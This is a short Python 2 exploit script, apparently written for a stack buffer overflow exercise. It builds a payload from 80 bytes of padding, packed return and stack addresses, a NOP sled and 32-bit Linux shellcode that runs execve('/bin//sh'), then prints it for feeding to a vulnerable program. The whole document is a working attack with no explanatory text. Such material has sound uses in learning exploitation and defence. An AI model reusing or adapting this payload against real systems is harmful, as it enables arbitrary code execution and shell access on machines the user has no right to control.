import struct
padding="A"*(80)
#eip='\x10\xd7\xff\xff' #0xffffd710 #ffffd700
ret=struct.pack("I", 0x080484f9)
eip=struct.pack("I", 0xffffd704+80) #0xffffd74c
nopsled="\x90"*100
breakpoint="\xCC"*4
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding+ret+eip+nopsled+shellcode